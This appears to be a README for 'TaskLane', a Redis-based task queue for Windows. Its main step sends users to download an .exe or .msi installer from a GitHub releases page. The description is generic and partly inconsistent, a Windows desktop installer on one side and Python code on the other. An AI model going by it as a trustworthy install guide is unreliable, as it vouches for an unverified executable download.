# 🚀 TaskLane - Organize and automate your daily tasks

[![Download TaskLane](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/musazwebi-lab/TaskLane/releases)

TaskLane helps you organize work across multiple computers. It manages queues and runs jobs in the background. You use it to save time on repeating computer tasks. It is light, simple, and ready to use without complex setup.

## 📋 What TaskLane Does

TaskLane acts as a traffic controller for your computer tasks. You give the program a list of things to do. TaskLane sends these tasks to available workers. It ensures each job gets done. You can use it to prepare images, send emails, or process data without waiting for the program to finish.

This software runs on a system that uses Redis. Redis acts as the waiting room where tasks sit until a worker picks them up. You do not need to build complex infrastructure. TaskLane handles the connection between your computer and the workers automatically.

## ⚙️ System Requirements

Before you install TaskLane, check these requirements:

- Operating System: Windows 10 or Windows 11.
- Memory: 4 gigabytes of RAM or more.
- Storage: 200 megabytes of free space.
- Network: A stable internet connection.
- Dependencies: You must install Redis on your machine for the system to store your queue information.

## 📥 How to Install TaskLane

Follow these steps to set up the software on your Windows computer.

1. Visit the [official releases page](https://github.com/musazwebi-lab/TaskLane/releases) to download the installer.
2. Choose the file ending in .msi or .exe for Windows.
3. Save the file to your Downloads folder.
4. Open the file to start the installation wizard.
5. Follow the prompts on the screen.
6. Click Finish when the process completes.

You will see a TaskLane icon on your desktop. Double-click this icon to start the application.

## 🛠️ Configuring Your Environment

TaskLane requires a running Redis server to function. If you are new to this, download the Redis for Windows installer. Once you install Redis, it runs in the background.

1. Start your Redis server.
2. Open TaskLane.
3. Navigate to the Settings menu.
4. Enter the address for your Redis server. For most users, this is localhost:6379.
5. Click Save.

TaskLane confirms the connection. If the connection fails, check that your Redis server is running and that your firewall allows the program to access network ports.

## 🚀 Running Your First Task

Once the connection is active, you can create your first job.

1. Open the TaskLane dashboard.
2. Click the New Task button.
3. Enter a name for your job.
4. Provide the command or script you want the worker to run.
5. Choose the priority level. High priority tasks jump to the front of the line.
6. Click Add to Queue.

You can view the status of your tasks in the main window. TaskLane shows you which jobs are pending, which are in progress, and which have finished.

## 🖥️ Using TaskLane with Multiple Workers

One strength of TaskLane involves scale. You can run workers on different machines.

1. Install TaskLane on secondary computers.
2. Point each TaskLane instance to the same Redis server.
3. Start the worker mode on these machines.

TaskLane distributes the load across all connected computers. This allows your primary machine to remain responsive while your secondary machines finish the heavy work.

## 🔒 Security Practices

Keep your setup safe by following these guidelines:

- Keep your TaskLane software updated.
- Use a strong password for your Redis connection if you expose it to a network.
- Run your workers from a dedicated user account with limited permissions.
- Disable unused ports on your computer.

## 🐛 Troubleshooting Common Issues

If TaskLane does not show your tasks, check these items:

- Is the Redis server running? Check the task manager for a Redis process.
- Are the workers connected? Look at the status light in the bottom corner of the TaskLane window.
- Is there an error in the logs? Click View Logs to see if the program reported a problem.
- Did the network disconnect? Verify your local network connection.

If you encounter errors that you cannot resolve, review the program logs and check the documentation for common error codes.

## 💡 Best Practices for Workflow

Organize your tasks to make the most of your computer power. Group similar tasks together. This prevents the worker from switching between different types of software. Name your tasks clearly so you can identify them at a glance.

If a task takes a long time, break it into smaller parts. This allows other tasks to run in between the segments. Monitor your system temperature if you run high-intensity tasks for long periods.

## 📄 Licensing Information

TaskLane follows standard open source terms. This software is free to use for personal or commercial projects. You may modify the code if you have experience with Python. Contribute your improvements back to the community through the GitHub repository.